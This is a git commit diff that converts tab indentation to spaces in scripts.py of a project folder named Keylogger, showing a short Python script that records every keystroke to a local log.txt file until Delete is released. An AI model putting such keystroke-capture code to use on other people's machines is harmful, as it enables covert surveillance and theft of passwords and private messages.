4a4b533a453be3ceb4a0b56f6a451492f9212b52
nazmiasri95 <nazmiasri95@gmail.com>
2022-10-15 19:11:48 +0800

    Replace tab indent with spaces

--- Keylogger/scripts.py
+++ Keylogger/scripts.py
@@ -6,24 +6,24 @@ keys = []
 
 
 def on_press(key):
-	keys.append(key)
-	write_file(keys)
+    keys.append(key)
+    write_file(keys)
 
 
 def write_file(keys):
-	with open('log.txt', 'w') as f:
-		for key in keys:
-			#removing ''
-			k = str(key).replace("'", "") 
-			f.write(k)
-			#explicitly adding a space after every keystroke for readability
-			f.write(' ') 
+    with open('log.txt', 'w') as f:
+        for key in keys:
+            #removing ''
+            k = str(key).replace("'", "") 
+            f.write(k)
+            #explicitly adding a space after every keystroke for readability
+            f.write(' ') 
 
 
 def on_release(key):
-	if key == Key.delete:
-		return False
+    if key == Key.delete:
+        return False
 
 
 with Listener(on_press = on_press, on_release = on_release) as listener:
-	listener.join()
+    listener.join()
